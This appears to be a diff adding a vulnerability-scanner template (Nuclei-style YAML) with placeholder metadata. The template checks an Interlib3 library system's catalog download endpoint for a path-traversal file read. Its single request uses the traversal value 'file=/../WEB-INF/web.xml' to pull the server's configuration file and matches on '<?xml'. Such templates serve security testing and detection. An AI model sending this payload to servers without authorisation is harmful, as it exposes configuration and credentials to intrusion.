@@ -1,0 +1,18 @@
+id: interlib3-downLoad-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interlib3/catalog/hold/downLoad?file=/../WEB-INF/web.xml"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
